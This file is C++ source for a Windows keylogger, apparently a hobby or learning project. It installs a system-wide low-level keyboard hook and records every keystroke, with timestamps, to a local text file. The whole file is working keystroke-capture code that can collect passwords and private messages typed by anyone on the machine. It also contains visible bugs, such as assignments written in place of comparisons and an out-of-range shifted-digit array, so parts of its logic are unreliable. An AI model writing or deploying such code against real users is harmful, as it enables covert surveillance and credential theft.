#include <windows.h> // neccesary or windows
#include <fstream>   //opening writing
#include <iostream>
#include <string>
#include <ctime>
#include <iomanip>

std::ofstream logFile;

// store the id of the keyboard hook
HHOOK keyboardHook;

// track wther it is the first keystroke of the session
bool isFirstKey = true;

// time helper
std::string GetformattedTime()
{
    time_t now = time(0);

    struct tm timeinfo;

    localtime_s(&timeinfo, &now);

    char buffer[20];

    strftime(buffer, sizeof(buffer), "[%H:%M:%S]", &timeinfo);

    return std::string(buffer);
}

// log keystrokes

void LogKey(int vkCode)
{
    logFile.open("keylogger.txt", std::ios::app);

    // print header when keylogger session first starts
    if (isFirstKey)
    {
        logFile << '\n'
                << std::string(60, '=') << '\n';
        logFile << "SESSION STARTED: " << GetformattedTime() << '\n';
        logFile << std::string(60, '=') << "\n\n";

        isFirstKey = false;
    }

    // check modifier states

    bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

    bool capsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;

    // convert VKC to readable characters

    // special control keys

    if (vkCode == VK_SPACE)
    {
        logFile << " ";
    }
    else if (vkCode == VK_RETURN)
    {
        logFile << '\n'
                << GetformattedTime() << " [ENTER]\n";
    }
    else if (vkCode == VK_BACK)
    {
        logFile << '\n'
                << GetformattedTime() << " [BACKSPACE]\n";
    }
    else if (vkCode == VK_TAB)
    {
        logFile << '\n'
                << GetformattedTime() << " [TAB]\n";
    }
    else if (vkCode == VK_ESCAPE)
    {
        logFile << '\n'
                << GetformattedTime() << " [ESC]\n";
    }
    else if (vkCode == VK_DELETE)
    {
        logFile << '\n'
                << GetformattedTime() << " [DELETE]\n";
    }

    // letter keys (A-Z)
    // 0x41 trough 0x5A are letters a-z
    else if (vkCode >= 0x41 && vkCode <= 0x5A)
    {
        bool isUpperCase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);

        if (isUpperCase)
        {
            logFile << (char)vkCode;
        }
        else
        {
            logFile << (char)(vkCode + 32);
        }
    }

    // number key(0-9)
    // 0x30 trough 0x39
    else if (vkCode >= 0x30 && vkCode <= 0x39)
    {
        if (shiftPressed)
        {
            char shiftNumbers[] = {')', '!', '@', '#', '$', '^', '&', '*', '('};

            int index = vkCode - 0x30;
            logFile << shiftNumbers[index];
        }
        else
        {
            logFile << (char)vkCode;
        }
    }

    // punctiation and special characters
    else if (vkCode == 0xBA || vkCode == 186)
    {
        // Colon/ SemiColon
        logFile << (shiftPressed ? ':' : ';');
    }
    else if (vkCode == 0xBB || vkCode == 187)
    {
        // Equals/Plus key
        logFile << (shiftPressed ? '+' : '=');
    }
    else if (vkCode == 0xBC || vkCode == 188)
    {
        // Comma/Less than key
        logFile << (shiftPressed ? '<' : ',');
    }
    else if (vkCode == 0xBD || vkCode == 189)
    {
        // Minus/Underscore key
        logFile << (shiftPressed ? '_' : '-');
    }
    else if (vkCode == 0xBE || vkCode == 190)
    {
        // Period/Greater than key
        logFile << (shiftPressed ? '>' : '.');
    }
    else if (vkCode == 0xBF || vkCode == 191)
    {
        // Forward slash/Question mark key
        logFile << (shiftPressed ? '?' : '/');
    }
    else if (vkCode == 0xC0 || vkCode == 192)
    {
        // Backtick/Tilde key
        logFile << (shiftPressed ? '~' : '`');
    }
    else if (vkCode == 0xDB || vkCode == 219)
    {
        // Left bracket key
        logFile << (shiftPressed ? '{' : '[');
    }
    else if (vkCode == 0xDC || vkCode == 220)
    {
        // Backslash/Pipe key
        logFile << (shiftPressed ? '|' : '\\');
    }
    else if (vkCode == 0xDD || vkCode == 221)
    {
        // Right bracket key
        logFile << (shiftPressed ? '}' : ']');
    }
    else if (vkCode == 0xDE || vkCode == 222)
    {
        // Quote key
        logFile << (shiftPressed ? '"' : '\'');
    }

    // function keys
    // VK_F1-VK_F12
    else if (vkCode >= VK_F1 && vkCode <= VK_F12)
    {
        int functionKeyNumber = (vkCode - VK_F1) + 1;
        logFile << GetformattedTime() << " [F" << functionKeyNumber << "] ";
    }

    // arrow keys
    else if (vkCode == VK_LEFT)
    {
        logFile << GetformattedTime() << " [LEFT] ";
    }
    else if (vkCode == VK_RIGHT)
    {
        logFile << GetformattedTime() << " [RIGHT] ";
    }
    else if (vkCode == VK_UP)
    {
        logFile << GetformattedTime() << " [UP] ";
    }
    else if (vkCode == VK_DOWN)
    {
        logFile << GetformattedTime() << " [DOWN] ";
    }

    // modifer keys
    else if (vkCode == 160 || vkCode == 0xA0)
    {
        logFile << GetformattedTime() << " [LSHIFT] ";
    }
    else if (vkCode == 161 || vkCode == 0xA1)
    {
        logFile << GetformattedTime() << " [RSHIFT] ";
    }
    else if (vkCode == 162 || vkCode == 0xA2)
    {
        logFile << GetformattedTime() << " [LCTRL] ";
    }
    else if (vkCode == 163 || vkCode == 0xA3)
    {
        logFile << GetformattedTime() << " [RCTLR] ";
    }
    else if (vkCode == 164 || vkCode == 0xA4)
    {
        logFile << GetformattedTime() << " [LALT] ";
    }
    else if (vkCode == 165 || vkCode == 0xA5)
    {
        logFile << GetformattedTime() << " [RALT] ";
    }

    // lock keys and special keys

    else if (vkCode = VK_CAPITAL)
    {
        logFile << GetformattedTime() << " [CAPSLOCK] ";
    }
    else if (vkCode = VK_NUMLOCK)
    {
        logFile << GetformattedTime() << " [NUMLOCK] ";
    }
    else if (vkCode = VK_SCROLL)
    {
        logFile << GetformattedTime() << " [SCROLLLOCK] ";
    }
    else if (vkCode == 91 || vkCode == 0x5B)
    {
        logFile << GetformattedTime() << " [LWIN] ";
    }
    else if (vkCode == 92 || vkCode == 0x5C)
    {
        logFile << GetformattedTime() << " [RWIN] ";
    }
    else if (vkCode == VK_APPS)
    {
        logFile << GetformattedTime() << " [APPS] ";
    }

    // unkown/unhandled keys
    else
    {
        logFile << GetformattedTime() << " [UNKNOWN_KEY:" << vkCode << " (0x" << std::hex << vkCode << std::dec << ")]";
    }

    // save data to disk

    logFile.flush(); // safety check to make sure it is saved
    logFile.close(); // closing log file
}

//  keyboard hook callback function

LRESULT CALLBACK LowLevelKeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            KBDLLHOOKSTRUCT *kdbStruct = (KBDLLHOOKSTRUCT *)lParam;

            int vkCode = kdbStruct->vkCode;

            LogKey(vkCode);
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// main function

BOOL WINAPI ConsoleHandler(DWORD dwType)
{
    if (dwType == CTRL_CLOSE_EVENT)
    {
        logFile.open("keylogger.txt", std::ios::app);
        if (logFile.is_open())
        {
            logFile << "\n"
                    << std::string(60, '=') << '\n';
            logFile << "session ended: " << GetformattedTime() << '\n';
            logFile << std::string(60, '=') << "\n\n";
            logFile.flush();
            logFile.close();
        }

        if (keyboardHook != NULL)
        {
            UnhookWindowsHookEx(keyboardHook);
        }
    }
    return TRUE;
}

int main()
{
    std::cout << "welcome to this keylogger! close the windows to exit.\n";
    std::cout << "all keystrokes will be logged to the keylogger.txt\n";

    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    // get process handle

    HINSTANCE hInstance = GetModuleHandle(NULL);

    // install keyboard hook

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyBoardProc, hInstance, 0);

    // check if hook was installed succesfuly

    if (keyboardHook == NULL)
    {
        std::cerr << "Failed to install the keyboard hook\n";
        std::cerr << "please make sure you are running the program as admin\n";
        return 1;
    }

    std::cout << "keyboard hook isntalled succesfuly\n";
    std::cout << "monitoring keyboard input..\n";

    // message loop

    MSG msg;   // the structure to hold message information
    BOOL bRet; //  return valur from getMessage()

    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0)
    {
        // check for errors
        if (bRet == -1)
        {
            std::cerr << "there was an error in your message loop\n";
            break;
        }
        else
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // cleanup (unsinstalling the hook)

    logFile.open("keylogger.txt", std::ios::app);
    if (logFile.is_open())
    {
        logFile << '\n'
                << std::string(60, '=') << '\n';
        logFile << "session ended: " << GetformattedTime() << '\n';
        logFile << std::string(60, '=') << "\n\n";
        logFile.flush();
        logFile.close();
    }
    UnhookWindowsHookEx(keyboardHook);

    std::cout << "keyboard hook unisntalled bye bye\n";

    return 0;
}